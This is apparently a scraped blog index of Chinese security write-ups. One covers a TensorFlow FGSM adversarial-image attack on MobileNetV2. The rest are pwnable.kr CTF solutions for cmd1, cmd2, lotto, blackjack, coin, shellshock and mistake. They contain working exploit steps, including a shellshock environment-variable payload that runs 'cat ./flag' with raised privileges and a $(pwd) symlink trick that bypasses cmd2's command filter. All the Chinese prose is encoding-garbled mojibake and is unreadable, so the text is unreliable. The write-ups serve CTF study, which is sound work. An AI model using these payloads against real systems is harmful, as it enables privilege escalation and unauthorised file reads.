mpl.rcParams[&#x27;figure.figsize&#x27;] = (8, 8)# å›¾ç‰‡ç½‘æ ¼mpl.rcParams[&#x27;axes.grid&#x27;] = False è½½å…¥MobileNetV2æ¨¡å‹12pretrained_model = tf.keras.applications.MobileNetV2(include_top=True, weights=&#x27;imagenet&#x27;)pretrained_model.trainable = False å›¾åƒé¢„å¤„ç†1234567891011121314def preprocess(image): image = tf.cast(image, tf.float32) image = image/255 image = tf.image.resize(image, (224, 224)) image = image[None, ...] return image# è·å–å›¾ç‰‡ä¿¡æ¯image_path = tf.keras.utils.get_file(&#x27;YellowLabradorLooking_new.jpg&#x27;,&#x27;https://storage.googleapis.com/download.tensorflow.org/example_images/YellowLabradorLooking_new.jpg&#x27;)image_raw = tf.io.read_file(image_path)image = tf.image.decode_image(image_raw)image = preprocess(image) å°†å›¾åƒè¾“å…¥æ¨¡å‹å¹¶å¾—åˆ°æ¦‚ç‡æœ€é«˜çš„åˆ†ç±»ç»“æœ12345# Helper function to extract labels from probability vectordef get_imagenet_label(probs): return tf.keras.applications.mobilenet_v2.decode_predictions(probs, top=1)[0][0]image_probs = pretrained_model.predict(image) å±•ç¤ºå›¾åƒ12345plt.figure()plt.imshow(image[0])_, image_class, class_confidence = get_imagenet_label(image_probs)plt.title(&#x27;&#123;&#125; : &#123;:.2f&#125;% Confidence&#x27;.format(image_class, class_confidence*100))plt.show() å¯ä»¥å‡†ç¡®åœ°é¢„æµ‹å‡ºå›¾åƒä¸ºæ‹‰å¸ƒæ‹‰å¤šçŠ¬ï¼ˆå¯èƒ½æ€§æœ€é«˜ä¸º37.16%ï¼‰ è®¡ç®—æ¢¯åº¦12345678910111213loss_object = tf.keras.losses.CategoricalCrossentropy()def create_adversarial_pattern(input_image, input_label): with tf.GradientTape() as tape: tape.watch(input_image) prediction = pretrained_model(input_image) loss = loss_object(input_label, prediction) # Get the gradients of the loss w.r.t to the input image. gradient = tape.gradient(loss, input_image) # Get the sign of the gradients to create the perturbation signed_grad = tf.sign(gradient) return signed_grad æ‰“å°æ·»åŠ çš„å™ªéŸ³å›¾åƒ1234567# Get the input label of the image.labrador_retriever_index = 208label = tf.one_hot(labrador_retriever_index, image_probs.shape[-1])label = tf.reshape(label, (1, image_probs.shape[-1]))perturbations = create_adversarial_pattern(image, label)plt.imshow(perturbations[0]) å®šä¹‰æ˜¾ç¤ºå›¾åƒçš„å‡½æ•°1234567def display_images(image, description): _, label, confidence = get_imagenet_label(pretrained_model.predict(image)) plt.figure() plt.imshow(image[0]) plt.title(&#x27;&#123;&#125; \\n &#123;&#125; : &#123;:.2f&#125;% Confidence&#x27;.format(description, label, confidence*100)) plt.show() åŠ å…¥å™ªå£°åå†å°†å›¾åƒè¾“å…¥æ¨¡å‹è¿›è¡Œåˆ¤æ–­12345678epsilons = [0, 0.01, 0.1, 0.15]descriptions = [(&#x27;Epsilon = &#123;:0.3f&#125;&#x27;.format(eps) if eps else &#x27;Input&#x27;) for eps in epsilons]for i, eps in enumerate(epsilons): adv_x = image + eps*perturbations adv_x = tf.clip_by_value(adv_x, 0, 1) display_images(adv_x, descriptions[i]) å…¶ä¸­epsilons è¡¨ç¤ºå™ªå£°çš„å¹²æ‰°ç¨‹åº¦ã€‚ è¾“å…¥å›¾ç‰‡ å™ªå£°ä¸º0.01 è¯†åˆ«ä¸ºIbizanæŸ´çŠ¬ å™ªå£°ä¸º0.1 è¯†åˆ«ä¸ºæµ´å·¾ å™ªå£°ä¸º0.15 è¯†åˆ«ä¸ºè„‘çŠç‘š å™ªå£°ä¸º0.20 è¯†åˆ«ä¸ºæ¯›æ¯¯ å¯è§ï¼Œè¾“å…¥å›¾ç‰‡æ·»åŠ å™ªå£°ä¹‹åå·²ç»ä¸èƒ½æ­£ç¡®åˆ†ç±»ã€‚","categories":[{"name":"AI","slug":"AI","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/AI/"},{"name":"Adversarial sample","slug":"AI/Adversarial-sample","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/AI/Adversarial-sample/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/AI/"}]},{"title":"cmd2","slug":"Pwnable_kr/cmd2","date":"2020-10-20T06:07:54.000Z","updated":"2020-10-20T07:27:30.000Z","comments":true,"path":"2020/10/20/Pwnable_kr/cmd2/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd2/","excerpt":"","text":"è¿™é‡Œç™»å½•çš„å¯†ç ä¸ºcmd1è§£å‡ºçš„flagï¼š 1mommy now I get what PATH environment is for :) æŸ¥çœ‹cmd2.cæºä»£ç 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd)&#123; int r=0; r += strstr(cmd, &quot;=&quot;)!=0; r += strstr(cmd, &quot;PATH&quot;)!=0; r += strstr(cmd, &quot;export&quot;)!=0; r += strstr(cmd, &quot;/&quot;)!=0; r += strstr(cmd, &quot;`&quot;)!=0; r += strstr(cmd, &quot;flag&quot;)!=0; return r;&#125;extern char** environ;void delete_env()&#123; char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p));&#125;int main(int argc, char* argv[], char** envp)&#123; delete_env(); putenv(&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;); if(filter(argv[1])) return 0; printf(&quot;%s\\n&quot;, argv[1]); system( argv[1] ); return 0;&#125; cmd2åœ¨cmd1çš„åŸºç¡€ä¸Šï¼ŒåŠ å¼ºäº†è¿‡æ»¤æ“ä½œã€‚è¿™é‡Œ$=ã€PATHã€exportã€/ã€$`$ã€flag$éƒ½ä¸å¯ä»¥ç”¨ã€‚ ä¸‹é¢ä»‹ç»ä¸€ç§æ–¹æ³•ï¼š æ€è·¯åˆ†æåˆ›å»ºlinuxè½¯é“¾æ¥æ–¹æ³•å¦‚ä¸‹ï¼š 12ln -s [æºæ–‡ä»¶æˆ–ç›®å½•][ç›®æ ‡æ–‡ä»¶æˆ–ç›®å½•]# è¿™é‡Œå¦‚æœå½“å‰æ–‡ä»¶å¤¹ä¸‹ä¸å­˜åœ¨è¯¥ç›®æ ‡æ–‡ä»¶ï¼Œä¼šè‡ªåŠ¨åˆ›å»ºï¼Œè½¯é“¾æ¥ç›¸å½“äºwindowsçš„å¿«æ·æ–¹å¼ é¦–å…ˆåœ¨/tmpç›®å½•ä¸‹å»ºç«‹è‡ªå·±çš„ç›®å½•xiaohong404(è¿™ä¸ªç›®å½•å¯ä»¥ä»»æ„å–åï¼Œä½†ä¸èƒ½å’Œå·²ç»å­˜åœ¨çš„æ–‡ä»¶åé‡å¤ï¼‰ï¼Œç„¶ååˆ›å»ºç›®å½•*/tmp/xiaohong404/cã€‚é‚£ä¹ˆï¼Œå¦‚æœåœ¨/tmp/xiaohong404/cç›®å½•ä¸‹æ‰§è¡Œpwdå‘½ä»¤å°±å¯ä»¥å¾—åˆ°è¿™ä¸ªè·¯å¾„å­—ç¬¦â€/tmp/xiaohong404/câ€œã€‚ç„¶ååœ¨/tmp/exploitç›®å½•ä¸‹æ„é€ catçš„è½¯é“¾æ¥ln -s /bin/cat catï¼Œåœ¨/tmp/exploit/cä¸‹å»ºç«‹flagçš„è½¯é“¾æ¥ln -s /home/cmd2/flag flagã€‚ç„¶ååœ¨/tmp/exploit/cä¸‹æ‰§è¡Œå‘½ä»¤/home/cmd2/cmd2â€$(pwd)at f**ï¼Œè¿™é‡Œè¡¨ç¤ºæ‰§è¡Œcmd2ç¨‹åºï¼Œç›¸å½“äº*./cmd2 â€œ$(pwd)at f\\â€œå°±å¯ä»¥å¾—åˆ°flagäº†ã€‚å…¶åŸç†å°±æ˜¯åˆ©ç”¨â€$(pwd)atâ€æ„é€ å‡º/tmp/xiaohong404/cat**å‘½ä»¤ã€‚ PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"cmd1","slug":"Pwnable_kr/cmd1","date":"2020-10-20T02:01:26.000Z","updated":"2020-10-20T07:26:42.000Z","comments":true,"path":"2020/10/20/Pwnable_kr/cmd1/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd1/","excerpt":"","text":"æŸ¥çœ‹cmd1.cæºä»£ç  putenvå‡½æ•°æ˜¯æ·»åŠ æˆ–è€…æ”¹å˜ä¸€ä¸ªç¯å¢ƒå˜é‡ã€‚ filterå‡½æ•°çš„ä½œç”¨æ˜¯é€šè¿‡strstrå‡½æ•°åŒ¹é…$flagã€shã€tmp$ä¸‰ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœæ£€æµ‹åˆ°è¿™ä¸‰ä¸ªå­—ç¬¦ä¸²ï¼Œåˆ™å‡½æ•°è¿”å›å€¼ä¸ä¸º0ï¼Œä¼šå¯¼è‡´ä¸»å‡½æ•°é€€å‡ºï¼Œæ— æ³•æ‰§è¡Œsystemå‡½æ•°ã€‚æ‰€ä»¥è¿™é‡Œéœ€è¦å°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²éšè—èµ·æ¥ï¼Œç»•è¿‡filterå‡½æ•°çš„æ£€æŸ¥ï¼Œä½†è¿™é‡Œæˆ‘ä»¬éœ€è¦å¾—åˆ°flagã€‚åˆä¸èƒ½ç›´æ¥è¾“å…¥flagï¼Œäºæ˜¯æƒ³åˆ°å¯ä»¥ä½¿ç”¨é€šé…ç¬¦æ¥ä»£æ›¿flagã€‚systemå‘½ä»¤çš„é»˜è®¤PWDç¯å¢ƒå˜é‡åº”è¯¥æ˜¯ä¸è¿™ä¸ªç¨‹åºçš„PWDç¯å¢ƒå˜é‡ç›¸åŒï¼Œè¿™ä¸ªç¯å¢ƒå˜é‡æ˜¯ä»€ä¹ˆï¼Œå°±æ˜¯é»˜è®¤â€œ./â€æ‰§è¡Œçš„æ–‡ä»¶å¤¹ç›®å½•ï¼Œä¸€èˆ¬æ˜¯æ ¹æ®ç¨‹åºè°ƒç”¨çš„bashçª—å£ç›®å½•æ¥çš„ã€‚ PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"lotto","slug":"Pwnable_kr/lotto","date":"2020-10-19T12:56:14.000Z","updated":"2020-10-20T00:50:22.000Z","comments":true,"path":"2020/10/19/Pwnable_kr/lotto/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/19/Pwnable_kr/lotto/","excerpt":"","text":"æŸ¥çœ‹lotto.cæºä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;unsigned char submit[6];void play()&#123; int i; printf(&quot;Submit your 6 lotto bytes : &quot;); fflush(stdout); int r; r = read(0, submit, 6); printf(&quot;Lotto Start!\\n&quot;); //sleep(1); // generate lotto numbers int fd = open(&quot;/dev/urandom&quot;, O_RDONLY); if(fd==-1)&#123; printf(&quot;error. tell admin\\n&quot;); exit(-1); &#125; unsigned char lotto[6]; if(read(fd, lotto, 6) != 6)&#123; printf(&quot;error2. tell admin\\n&quot;); exit(-1); &#125; for(i=0; i&lt;6; i++)&#123; lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 &#125; close(fd); // calculate lotto score int match = 0, j = 0; for(i=0; i&lt;6; i++)&#123; for(j=0; j&lt;6; j++)&#123; if(lotto[i] == submit[j])&#123; match++; &#125; &#125; &#125; // win! if(match == 6)&#123; system(&quot;/bin/cat flag&quot;); &#125; else&#123; printf(&quot;bad luck...\\n&quot;); &#125;&#125;void help()&#123; printf(&quot;- nLotto Rule -\\n&quot;); printf(&quot;nlotto is consisted with 6 random natural numbers less than 46\\n&quot;); printf(&quot;your goal is to match lotto numbers as many as you can\\n&quot;); printf(&quot;if you win lottery for *1st place*, you will get reward\\n&quot;); printf(&quot;for more details, follow the link below\\n&quot;); printf(&quot;http://www.nlotto.co.kr/counsel.do? method=playerGuide#buying_guide01\\n\\n&quot;); printf(&quot;mathematical chance to win this game is known to be 1/8145060.\\n&quot;);&#125;int main(int argc, char* argv[])&#123; // menu unsigned int menu; while(1)&#123; printf(&quot;- Select Menu -\\n&quot;); printf(&quot;1. Play Lotto\\n&quot;); printf(&quot;2. Help\\n&quot;); printf(&quot;3. Exit\\n&quot;); scanf(&quot;%d&quot;, &amp;menu); switch(menu)&#123; case 1: play(); break; case 2: help(); break; case 3: printf(&quot;bye\\n&quot;); return 0; default: printf(&quot;invalid menu\\n&quot;); break; &#125; &#125; return 0;&#125; ç¨‹åºçš„å¤§è‡´é€»è¾‘ä¸ºï¼Œç”¨æˆ·è¾“å…¥6ä¸ªå­—ç¬¦ï¼Œå¦‚æœä¸ç³»ç»Ÿä¸­/dev/urandoméšæœºç”Ÿæˆçš„æ•°ç›¸åŒï¼Œç´¯è®¡å¯ä»¥è¾¾åˆ°6åˆ†åˆ™æœ€åå¯æ‹¿åˆ°flagã€‚æ˜¾ç„¶ï¼Œéœ€è¦å¯»æ‰¾æªæ–½è¿›è¡Œç»•è¿‡ï¼Œé‡ç‚¹åœ¨äºplayå‡½æ•°ã€‚ æŸ¥çœ‹playå‡½æ•° åˆ¤æ–­ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦å’Œéšæœºæ•°æ˜¯å¦ç›¸åŒæœ¬åº”è¯¥æ˜¯ä¸€é‡forå¾ªç¯ï¼Œè€Œè¿™é‡Œä½¿ç”¨äº†ä¸¤é‡forå¾ªç¯ï¼Œåˆ¤æ–­çš„æ˜¯è¦æ±‚çš„æ¯ä¸€ä½åªè¦æˆ‘ä»¬è¾“å…¥çš„6ä½ä¸­å­˜åœ¨å°±å¯ä»¥äº†ï¼Œä¸ç®¡æ˜¯å“ªä¸€ä½éƒ½å¯ä»¥ï¼Œåªè¦æœ‰å…­ä¸ªç›¸ç­‰å°±å¥½äº†ã€‚é‚£åªéœ€è¦ä¸€ç›´å°è¯•åŒä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ€»æœ‰ä¸€æ¬¡äººå“å¥½ã€‚å¦å¤–ï¼Œæ³¨æ„è¿™é‡Œéšæœºç”Ÿæˆçš„å­—ç¬¦ASCIIç èŒƒå›´ä¸º1~45ï¼Œå‚ç…§ASCIIç è¡¨ï¼Œåªæœ‰ DEC 33 å¼€å§‹æ‰æ˜¯å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦è¾“å…¥çš„å­—ç¬¦ä¸º ASCII DEC 33 åˆ° 45 ã€‚ PWNå¯ä»¥ç¼–å†™pythonè„šæœ¬ï¼Œä¹Ÿå¯ä»¥ç›´æ¥è‡ªå·±å¤šæ¬¡é‡å¤è¾“å…¥ã€‚","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"blackjack","slug":"Pwnable_kr/blackjack","date":"2020-10-19T00:54:25.000Z","updated":"2020-10-19T07:09:34.000Z","comments":true,"path":"2020/10/19/Pwnable_kr/blackjack/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/","excerpt":"","text":"æ€è·¯åˆ†ææœ¬é¢˜é“¾æ¥æ‰“ä¸å¼€äº†ï¼ï¼ï¼ åªèƒ½å‚è€ƒåˆ«äººçš„wp æœ‰ä¸¤ä¸ªæ¯”è¾ƒå…³é”®çš„ç‚¹ åˆ¤æ–­ç”¨æˆ·ä¸‹æ³¨çš„é‡‘é¢å¦‚æœå¤§äºç”¨æˆ·æ‹¥æœ‰çš„é‡‘é¢ï¼Œåˆ™ä¼šæç¤ºç”¨æˆ·ä¸èƒ½ä¸‹æ³¨ï¼Œä½†ç¨‹åºçš„æ¼æ´åœ¨äºå¦‚æœè¾“å…¥çš„é‡‘é¢æ˜¯è´Ÿæ•°ï¼Œä¼šç›´æ¥é€šè¿‡ï¼Œå¹¶ä¸”è¿”å›è¾“å…¥çš„ä¸‹æ³¨é‡‘é¢ã€‚ å¦‚æœç”¨æˆ·è¾“äº†ï¼Œåˆ™ä¼šæ‰£é™¤ç”¨æˆ·ä¸‹æ³¨çš„é‡‘é¢ï¼Œè¿™é‡Œä½¿ç”¨ç®€å•çš„å‡æ³•æ“ä½œï¼Œç»“åˆå‰é¢ä¸‹æ³¨é‡‘é¢å¯ä»¥ä¸ºè´Ÿæ•°ï¼Œåˆ™ç›´æ¥è¾“å…¥ä¸€ä¸ªå¾ˆå¤§çš„è´Ÿæ•°ï¼Œä¹‹åæ•…æ„è¾“æ‰æ¯”èµ›ï¼Œä½¿å¾—é‡‘é¢è¶…è¿‡é˜ˆå€¼æ‹¿åˆ°flagã€‚ PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"coin","slug":"Pwnable_kr/coin","date":"2020-10-18T13:26:46.000Z","updated":"2020-10-19T07:09:48.000Z","comments":true,"path":"2020/10/18/Pwnable_kr/coin/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/18/Pwnable_kr/coin/","excerpt":"","text":"ä½¿ç”¨netcatè¿æ¥ä¸Šè¿œç¨‹çš„æœåŠ¡å™¨ é¢˜ç›®æ˜¯ä¸€ä¸ªæ¸¸æˆï¼Œå¤§è‡´æ„æ€æ˜¯ï¼Œä¸€å †ç¡¬å¸ï¼Œæœ‰ä¸€ä¸ªå‡å¸ï¼Œé‡é‡ä¸º9ï¼Œè€Œå…¶ä»–ä¸º10ï¼Œè¦é€šè¿‡ç»™å®šçš„Cæ¬¡æœºä¼šå†…æ‰¾åˆ°å‡å¸ã€‚ä¸€å…±è¦åœ¨30så†…æ‰¾åˆ°100ä¸ªå‡å¸ï¼Œä¹Ÿå°±æ˜¯å®Œæˆ100æ¬¡æ¸¸æˆï¼Œæœ€ç»ˆä¼šç»™å‡ºflagã€‚ æ€è·¯åˆ†æç®€å•çš„äºŒåˆ†æ³•ï¼Œä½†è¿™é‡Œä¸èƒ½ä»æœ¬åœ°ç›´æ¥è¿è¿œç¨‹æœåŠ¡å™¨ï¼Œè¿™æ ·ä¼šè¶…æ—¶ï¼Œéœ€è¦é€šè¿‡ä¹‹å‰çš„è¿æ¥ç™»å½•è¿œç¨‹æœåŠ¡å™¨ï¼Œä¹‹ååœ¨æœåŠ¡å™¨ä¸Šç¼–å†™è„šæœ¬è¿è¡Œï¼Œä¸‹é¢çš„ä»£ç å³å¯æˆåŠŸè¿è¡Œï¼š 1234567891011121314151617181920212223242526272829303132333435from pwn import *import rep = remote(&#x27;localhost&#x27;, 9007)print(p.recv())for i in range(100): N, C = re.findall(&quot;N=(\\d+) C=(\\d+)&quot;, p.recv())[0] N = int(N) C = int(C) print(N, C) start, end = 0, N-1 while start &lt;= end and C &gt; 0: mid = (start + end) // 2 x = &quot; &quot;.join([str(j) for j in range(start, mid+1)]) # build range list p.sendline(x) res = int(p.recvline()[:-1]) if res % 10 == 0: start = mid+1 # through first half else: end = mid-1 # through second half C -= 1 while C &gt; 0: # use all the tries p.sendline(&quot;0&quot;) p.recv(1024) C -= 1 p.sendline(str(start)) # final answer print(p.recv())print(p.recv()) æ³¨æ„è¿™é‡Œæœ‰ä¸ªç»†èŠ‚æ˜¯éœ€è¦å…ˆè¿›å…¥æœåŠ¡å™¨çš„/tmpæ–‡ä»¶å¤¹ä¸‹ï¼Œä¹‹åè‡ªå·±å†ä¸»åŠ¨å»ºç«‹ä¸€ä¸ªæ–°çš„æ–‡ä»¶å¤¹ï¼Œå¦åˆ™ä¼šæ²¡æœ‰æƒé™è®¿é—®pythonçš„åº“ï¼Œä¸€ç›´æç¤ºæœªå®šä¹‰çš„é”™è¯¯ã€‚ä¹‹ååœ¨è¿™ä¸ªæ–°çš„æ–‡ä»¶å¤¹ä¸‹å»ºç«‹ä¸€ä¸ªpythonæ–‡ä»¶ï¼Œå¯ä»¥éšä¾¿å–ä¸ªåå­—ï¼Œè¿™é‡Œæˆ‘å°±å‘½åä¸ºcoin.pyã€‚ PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"shellshock","slug":"Pwnable_kr/shellshock","date":"2020-10-18T06:00:22.000Z","updated":"2020-10-19T07:10:16.000Z","comments":true,"path":"2020/10/18/Pwnable_kr/shellshock/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/","excerpt":"","text":"æŸ¥çœ‹shellshock.cæºæ–‡ä»¶ ç¨‹åºä¾æ¬¡è¿è¡Œä¸‰ä¸ªå‡½æ•°*setresuidã€setresgidã€system* æŸ¥çœ‹ç¨‹åºçš„æ‰§è¡Œæƒé™ ä»¥shellshockèº«ä»½å¯åŠ¨æ—¶ï¼Œç¨‹åºçš„æƒé™æ˜¯otheræƒé™r-xï¼Œè€Œåœ¨setresuidå’Œsetresgidä¸­ä½¿ç”¨çš„æ˜¯effective gidï¼Œä¹Ÿå°±æ˜¯shellshock_pwnçš„æƒé™r-sï¼Œå½“ç¨‹åºæ‰§è¡Œåˆ°systemæ—¶ï¼Œç¨‹åºå·²ç»å…·æœ‰shellshock_pwnç»„æƒé™äº†ã€‚ è¿™ä¸ªç»„æƒé™å¯¹äºflagæ–‡ä»¶æ¥è¯´æ˜¯å¯è¯»çš„ï¼ˆrâ€“ï¼‰ï¼Œä½†æ˜¯é—®é¢˜åœ¨äºè¿™ä¸€æ®µç¨‹åºå¹¶æ²¡æœ‰æ¶‰åŠå¯¹flagçš„è¯»æ“ä½œï¼Œæƒé™è™½ç„¶æœ‰äº†ï¼Œä½†æ€ä¹ˆåŠå‘¢ï¼Ÿæ˜¾ç„¶è¿™é‡Œåˆ©ç”¨shellshockæ¼æ´ã€‚å¯é€šè¿‡ä¸‹é¢çš„å‘½ä»¤è¯æ˜ç¡®å®å­˜åœ¨shellshockæ¼æ´ï¼š 1env x=&#x27;() &#123; :;&#125;; echo vulnerable&#x27; ./bash -c &quot;echo this is a test&quot; å®é™…ä¸Šï¼Œâ€œx=â€™() { :;}; echo vulnerableâ€â€‹æ˜¯newå‡ºæ¥äº†ä¸€ä¸ªæ–°çš„ç¯å¢ƒå˜é‡ï¼š 12KEY=xVALUE=() &#123;:;&#125;; echo vulnerable è€Œå½“æˆ‘ä»¬åç»­æ‰§è¡Œbashçš„æ—¶å€™ï¼Œæœ€ç»ˆä¼šå®šä½åˆ°initialize_shell_variablesä¸­ï¼Œè¿™ä¸ªå‡½æ•°å†…éƒ¨ä¼šéå†æ‰€æœ‰çš„ç¯å¢ƒå˜é‡ï¼Œè€Œæˆ‘ä»¬è®¾è®¡çš„VALUEç»•è¿‡äº†å…¶ä¸­ä¸€ä¸ªexportå‡½æ•°çš„å®šä¹‰æ£€æŸ¥ï¼Œä½¿å¾—æœ€ç»ˆæ‰§è¡Œçš„æ˜¯åé¢çš„echo vulnerableä¸²ã€‚æ‰€ä»¥ï¼Œè°ƒç”¨bashçš„æ—¶å€™ï¼Œè‡ªå®šä¹‰çš„è¿™ä¸ªè¯­å¥å°±ä¼šè§¦å‘ã€‚ç®€è€Œè¨€ä¹‹ï¼Œè¿™ä¸ªæ¼æ´ä¼šæŠŠç”¨æˆ·è¾“å…¥çš„æŒ‡ä»¤å½“ä½œä»£ç æ‰§è¡Œã€‚ äºæ˜¯ï¼Œæˆ‘ä»¬åœ¨è¿™æ¡è¯­å¥çš„åŸºç¡€ä¸Šå°†è‡ªå®šä¹‰è¯­å¥æ¢ä¸ºbash -c â€œcat ./flagâ€ï¼Œæ‰§è¡Œçš„ç¨‹åºbash -cæ¢æˆ./shellshock(å®ƒå†…éƒ¨è°ƒç”¨äº†bash -c â€˜echo shock_meâ€™)ï¼Œå› æ­¤å½“æ‰§è¡Œshellshockä¸­çš„systemå‡½æ•°ä¼šè°ƒç”¨bashï¼Œæ€»è€Œè‡ªåŠ¨æ‰§è¡Œcat flagè¿™æ¡å‘½ä»¤ï¼Œå› ä¸º./shellshockæ‰§è¡Œæ—¶æ‹¿åˆ°äº†shellshock_pwnçš„æƒé™ï¼Œä»è€Œç ´å£³æ¼æ´å¯ä»¥åœ¨æ­¤æƒé™ä¸ŠæˆåŠŸæ‰§è¡Œäº†cat ./flagï¼Œå³æˆåŠŸå®ç°äº†ææƒæ“ä½œã€‚ PWNè¿è¡Œä¸‹é¢è¯­å¥æ‹¿åˆ°flag 1env x=&#x27;() &#123; :;&#125;; bash -c &quot;cat ./flag&quot;&#x27; ./shellshock å…³äºshellshockæ¼æ´ç›¸å…³çŸ¥è¯†å¯å‚è€ƒï¼š 1ã€å…³äºShellShockæ¼æ´çš„åˆ©ç”¨è¿‡ç¨‹å’ŒåŸç†è§£æ - CSDNåšå®¢ 2ã€ç ´å£³ï¼ˆShellShockï¼‰æ¼æ´æ ·æœ¬åˆ†ææŠ¥å‘Š","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"mistake","slug":"Pwnable_kr/mistake","date":"2020-10-18T05:13:53.000Z","updated":"2020-10-19T07:10:04.000Z","comments":true,"path":"2020/10/18/Pwnable_kr/mistake/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/","excerpt":"","text":"æŸ¥çœ‹mistake.cæºæ–‡ä»¶1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void xor(char* s, int len)&#123; int i; for(i=0; i&lt;len; i++)&#123; s[i] ^= XORKEY; &#125;&#125;int main(int argc, char* argv[])&#123; int fd; if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)&#123; printf(&quot;can&#x27;t open password %d\\n&quot;, fd); return 0; &#125; printf(&quot;do not bruteforce...\\n&quot;); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123; printf(&quot;read error\\n&quot;); close(fd); return 0; &#125; char pw_buf2[PW_LEN+1]; printf(&quot;input password : &quot;); scanf(&quot;%10s&quot;, pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123; printf(&quot;Password OK\\n&quot;); system(&quot;/bin/cat flag\\n&quot;); &#125; else&#123; printf(&quot;Wrong Password\\n&quot;); &#125; close(fd); return 0;&#125; 